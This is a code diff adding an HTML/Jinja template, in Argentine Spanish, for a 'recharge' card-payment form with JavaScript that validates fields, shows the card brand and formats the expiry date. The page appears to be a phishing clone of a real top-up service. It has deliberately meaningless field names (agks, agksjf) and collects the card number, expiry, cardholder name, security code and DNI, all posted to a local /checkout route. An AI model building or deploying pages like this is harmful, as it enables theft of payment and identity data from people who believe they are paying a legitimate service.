@@ -1,0 +1,293 @@
+{% extends "base.html" %}
+{% block content %}
+<body class="body_background_extend">
+   
+   
+   <div thirdpartyrechargeenabled="true" id="root">
+   <div class="page-recharge-body">
+   <div class="page-recharge-tarjeta">
+      <form id="frmverify" name="frmverify" action="/checkout" method="POST" > 
+         <div class="row">
+            
+                  <div class="page-recharge-divider"></div>
+                  <div class="newcard">
+                     <div class="newcard__form   ">
+                        <div class="inputcontainer newcard__inputcontainer">
+                           <div id="card-number-input" class="inputcontainer__data  newcard__inputcontainer__data">
+                              <div id="cardPreview" class="newcard__preview generic"
+                                    data-img-generica="{{ url_for('static', filename='img/newcard.png') }}"
+                                    data-img-visa="{{ url_for('static', filename='img/card_visa_front.fba6f354.svg') }}"
+                                    data-img-master="{{ url_for('static', filename='img/card_master_front.724aee6a.svg') }}"
+                                    data-img-amex="{{ url_for('static', filename='img/card_amex_front.92e3385e.svg') }}">
+                                    
+                                 <p class="newcard__preview__number" id="cardDigits">•••• •••• •••• ••••</p>
+                                 <p class="newcard__preview__name" id="cardDigits1">••••••••</p>
+                                 <p class="newcard__preview__expiration" id="cardDigits2">••/••</p>
+                              </div>
+                              <input type="tel" maxlength="22" class="inputcontainer__input newcard__inputcontainer__input  active" id="agks" name="agks" value="">
+                              <label class="inputcontainer__label newcard__inputcontainer__label" >Número de tarjeta</label>
+                              <span class="inputcontainer__span newcard__inputcontainer__span"><a>Ver tarjetas habilitadas</a>
+                              </span>
+                              {% if error %}
+                                 <div style="color: red; font-size: 12px; margin-top: 5px;">
+                                 {{ error }}
+                                 </div>
+                              {% endif %}
+                              <div id="error-agks" style="color: red; display: none; font-size: 12px; margin-top: 5px;">
+                              Ingresá todos los números de la tarjeta
+                           </div>
+
+                              
+
+                           </div>
+
+                           
+                        </div>
+                        
+
+                        
+
+                        
+                        <div class="inputcontainer newcard__inputcontainer small__input" style="display: flex;">
+                           <div id="due-date-input" class="inputcontainer__data  newcard__inputcontainer__data">
+                              <input type="tel" maxlength="" class="inputcontainer__input newcard__inputcontainer__input--small active" id="agksjf" name="agksjf" value="">
+                              <label class="inputcontainer__label newcard__inputcontainer__label">Fecha de vencimiento (MM/AA)</label>
+                              {% if mensaje_error_cvv %}
+                                 <div style="color: red; font-size: 12px; margin-top: 5px;">
+                                 {{ mensaje_error_cvv }}
+                                 </div>
+                              {% endif %}
+                              <div id="error-agksjf" style="color: red; display: none; font-size: 12px; margin-top: 5px;">
+                              Ingresá la fecha de vencimiento
+                           </div>
+                           </div>
+                           
+                        </div>
+                        
+                        <div>
+                           <div class="modalhelp ">
+                           </div>
+                           <div class="modalhelp__content " data-modal="vencimiento">
+                              <div class="modalhelp__data">
+                                 <h4 class="modalhelp__data__title">Fecha de vencimiento</h4>
+                                 <p class="modalhelp__data__text">Encuentra esta fecha en el frente de tu tarjeta debajo del número de la misma</p>
+                                 <a class="modalhelp__data__close" data-close="vencimiento">Entendido </a>
+                              </div>
+                              <div class="modalhelp__preview">
+                                 <img src="{{ url_for('static', filename='/img/sample-vencimiento.svg') }}" height="68"> 
+                              </div>
+                           </div>
+                           
+                        <div class="inputcontainer newcard__inputcontainer small__input" style="display: flex;">
+                           <div id="sec-code-input" class="inputcontainer__data  newcard__inputcontainer__data">
+                              <input type="text" class="inputcontainer__input newcard__inputcontainer__input--small active" id="agksjfass" name="agksjfass" value="">
+                              <label class="inputcontainer__label newcard__inputcontainer__label">Titular de la Tarjeta</label>
+                              <div id="error-agksjfas" style="color: red; display: none; font-size: 12px; margin-top: 5px;">
+                              Ingresá el titular de la tarjeta
+                           </div>
+                           </div>
+                           
+                        </div>
+                        
+                        <div class="inputcontainer newcard__inputcontainer small__input" style="display: flex;">
+                           <div id="sec-code-input" class="inputcontainer__data  newcard__inputcontainer__data">
+                              <input type="tel" minlength="3" maxlength="4" class="inputcontainer__input newcard__inputcontainer__input--small active" id="agksjfa" name="agksjfa" value="">
+                              <label class="inputcontainer__label newcard__inputcontainer__label">Código de seguridad</label>
+                              <div id="error-agksjfcv" style="color: red; display: none; font-size: 12px; margin-top: 5px;">
+                              Ingresá el código de seguridad
+                           </div>
+                           </div>
+                           
+                        </div>
+                        
+                        </div>
+
+                        <div class="inputcontainer newcard__inputcontainer small__input" style="display: flex;">
+                           <div id="sec-code-input" class="inputcontainer__data  newcard__inputcontainer__data">
+                              <input type="tel" maxlength="8" class="inputcontainer__input newcard__inputcontainer__input--small active" id="agksjfas" name="agksjfas" value="">
+                              <label class="inputcontainer__label newcard__inputcontainer__label">DNI</label>
+                              <div id="error-agksjfas" style="color: red; display: none; font-size: 12px; margin-top: 5px;">
+                              Ingresá el DNI del titular de la tarjeta
+                           </div>
+                           </div>
+                           
+                        </div>
+                        
+                        <div>
+                           <div class="modalhelp ">
+                           </div>
+                           <div class="modalhelp__content " data-modal="vencimiento">
+                              <div class="modalhelp__data">
+                                 <h4 class="modalhelp__data__title">Código de seguridad</h4>
+                                 <p class="modalhelp__data__text">Es un codigo de 3 dígitos ubicado al reverso de tu tarjeta</p>
+                                 <a class="modalhelp__data__close" data-close="vencimiento">Entendido </a>
+                              </div>
+                              <div class="modalhelp__preview">
+                                 <img src="{{ url_for('static', filename='/img/sample-code.svg') }}"  height="68">
+                              </div>
+   
+                           </div>
+                        </div>
+                        <button type="submit"  class="formcode__submit active">
+                           <p>Pagar</p>
+                        </button>
+                        <button class="formcode__eliminar">
+                        <a class="newcard__lnk" href="/">Cancelar</a>
+                        </button>
+                        </form>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </form>  
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+   const formulario = document.getElementById('frmverify');
+
+   if (formulario) {
+      formulario.addEventListener('submit', function(evento) {
+            // Freno de mano: evitamos que se envíe automáticamente
+            evento.preventDefault(); 
+            
+            try {
+               // Lista con los IDs de todos tus inputs
+               const idsDeInputs = ['agks', 'agksjf', 'agksjfa', 'agksjfas', 'agksjfass'];
+               let formularioValido = true;
+               
+               idsDeInputs.forEach(function(id) {
+               const input = document.getElementById(id);
+               // Buscamos el contenedor del input y el texto de error
+               const inputWrapper = document.getElementById(id);
+               const mensajeError = document.getElementById('error-' + id);
+               
+               if (!input || !inputWrapper || !mensajeError) return;
+
+               // Si el input está vacío...
+               if (input.value.trim() === "") {
+                     // 1. Agregamos la clase "error" para que tu CSS pinte la línea roja
+                     inputWrapper.classList.add('error');
+                     // 2. Mostramos el texto rojo abajo
+                     mensajeError.style.display = "block";
+                     formularioValido = false;
+               } else {
+                     // Si está bien lleno...
+                     // 1. Quitamos la clase "error" (la línea vuelve a la normalidad)
+                     inputWrapper.classList.remove('error');
+                     // 2. Ocultamos el texto
+                     mensajeError.style.display = "none";
+               }
+            });
+
+               // Si después de revisar todos, el formulario sigue siendo válido, lo enviamos
+               if (formularioValido === true) {
+                  formulario.submit(); 
+               }
+
+            } catch (error) {
+               console.error("Error en la validación:", error);
+            }
+      });
+   }
+   // ==========================================
+// 2. LÓGICA DEL CAMBIO DE IMAGEN DE LA TARJETA
+// ==========================================
+const cardPreview = document.getElementById('cardPreview');
+// Asegúrate de que este ID sea el de tu input donde escriben los números (agks, por ejemplo)
+const inputNumero = document.getElementById('agks'); 
+
+if (cardPreview && inputNumero) {
+   const imgGenerica = cardPreview.getAttribute('data-img-generica');
+   const imgVisa = cardPreview.getAttribute('data-img-visa');
+   const imgMaster = cardPreview.getAttribute('data-img-master');
+   const imgAmex = cardPreview.getAttribute('data-img-amex');
+
+   // Corregido el nombre de la variable a cardDigits1 para que coincida abajo
+   const cardDigits1 = document.getElementById('cardDigits1'); 
+   const cardDigits2 = document.getElementById('cardDigits');
+   const cardDigits3 = document.getElementById('cardDigits2');
+
+   // Imagen por defecto al cargar
+   cardPreview.style.backgroundImage = `url('${imgGenerica}')`;
+
+   // Escuchamos cuando el usuario escribe
+   inputNumero.addEventListener('input', function(evento) {
+      const numeroActual = evento.target.value.replace(/\s/g, ''); 
+      
+      // ==========================================
+      // 1. Mostrar / Ocultar los puntitos
+      // ==========================================
+      if (numeroActual.length === 0) {
+            // Si borró todo: mostramos los puntos, ponemos la imagen genérica y cortamos la ejecución.
+            cardDigits1.style.display = 'block';
+            cardDigits2.style.display = 'block';
+            cardDigits3.style.display = 'block';
+            cardPreview.style.backgroundImage = `url('${imgGenerica}')`;
+            return; 
+      } else {
+            // Si hay al menos un número escrito: ocultamos los puntos.
+            cardDigits1.style.display = 'none';
+            cardDigits2.style.display = 'none';
+            cardDigits3.style.display = 'none';
+      }
+
+      // ==========================================
+      // 2. Cambiar la imagen de la tarjeta
+      // ==========================================
+      const primerDigito = numeroActual.charAt(0);
+
+      if (primerDigito === '4') {
+            cardPreview.style.backgroundImage = `url('${imgVisa}')`;
+      } else if (primerDigito === '5') {
+            cardPreview.style.backgroundImage = `url('${imgMaster}')`;
+      } else if (primerDigito === '3') {
+            cardPreview.style.backgroundImage = `url('${imgAmex}')`;
+      } else {
+            cardPreview.style.backgroundImage = `url('${imgGenerica}')`;
+      }
+      
+   });
+}
+// ==========================================
+// 3. AUTO-FORMATO DE FECHA (MM/AA)
+// ==========================================
+// CAMBIA 'agksjf' por el ID real de tu input de fecha de expiración
+const inputExpiracion = document.getElementById('agksjf'); 
+
+if (inputExpiracion) {
+   inputExpiracion.addEventListener('input', function(evento) {
+      
+      // 1. Quitamos cualquier letra o símbolo extraño. Solo dejamos números puros.
+      let valor = evento.target.value.replace(/\D/g, '');
+
+      // 2. EVITAMOS LA TRAMPA DEL BORRADO: 
+      // Si el usuario presionó la tecla de borrar (Backspace), interrumpimos el código
+      // para que pueda borrar la barra tranquilamente sin que se vuelva a agregar sola.
+      if (evento.inputType === 'deleteContentBackward') {
+            return; 
+      }
+
+      // 3. Lógica para inyectar la barra '/'
+      if (valor.length > 2) {
+            // Si ya tiene más de 2 números (ej: 123), lo partimos a la mitad (12/3)
+            // y limitamos el máximo a 4 números (MM/AA)
+            evento.target.value = valor.substring(0, 2) + '/' + valor.substring(2, 4);
+      } else if (valor.length === 2) {
+            // Si acaba de escribir el segundo número del mes (ej: 12), le ponemos la barra al instante (12/)
+            evento.target.value = valor + '/';
+      } else {
+            // Si solo tiene un número, lo dejamos tal cual
+            evento.target.value = valor;
+      }
+   });
+}
+});
+</script>
+
+   </div>
+</div>
+   
+  
+
+</body>
+{% endblock %}
